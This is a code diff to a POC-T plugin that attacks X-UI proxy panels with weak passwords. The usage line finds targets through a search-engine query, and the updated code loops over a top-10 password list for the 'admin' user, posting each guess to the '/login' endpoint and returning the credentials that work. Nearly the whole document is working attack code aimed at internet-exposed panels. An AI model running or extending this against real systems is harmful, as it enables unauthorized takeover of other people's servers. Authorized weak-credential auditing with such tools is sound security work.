@@ -5,20 +5,13 @@
 @DateTime :  2023/3/11 18:01
 @Usage:
     python2 POC-T.py -s ssr-xui_weak_pass.py -aF "port=54321 && body='xui'"
-
+    admin/admin
 '''
+import json
 
-from lib.utils.http import request, get_schemed_url, urljoin_ex
-from lib.core.data import paths, logger
-
-
-def _get_post_data(pwd="admin"):
-    pwd = pwd.strip()
-    post_data = {
-        "username": "admin",
-        "password": pwd
-    }
-    return post_data
+from lib.utils.http import request_ex, get_http_url, urljoin_ex
+from lib.core.data import logger as log
+from lib.utils.dic import Wordlist
 
 
 def _is_valid_login(resp):
@@ -32,27 +25,21 @@ def _is_valid_login(resp):
         return True
 
 
-def login_by_url_and_pwd(login_url, pwd):
-    post_data = _get_post_data(pwd)
-    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
-    if _is_valid_login(resp):
-        msg = "%s, admin/%s, %s second" % (login_url, "admin", resp.elapsed.total_seconds())
-        logger.info(msg)
-        return True
-    else:
-        return False
-
-
 def poc(url):
-    url = get_schemed_url(url)
+    url = get_http_url(url)
     login_url = urljoin_ex(url, "/login")
 
-    # with open(paths.WEAK_PASS_10, "r") as f:
-    #     pwd_list = f.readlines()
-    # for pwd in pwd_list:
-    valid = login_by_url_and_pwd(login_url, "admin")
-    if valid:
-        return True
-    else:
+    for pwd in Wordlist.top_10_pass:
+        poster = {
+            "username": "admin",
+            "password": pwd
+        }
+        resp = request_ex("post", login_url, json=poster, timeout=8)
+        if _is_valid_login(resp):
+            msg = "%s\t%s" % (url, json.dumps(poster))
+            return msg
+        else:
+            continue
+
     # fail when finished
-       return False
+    return False
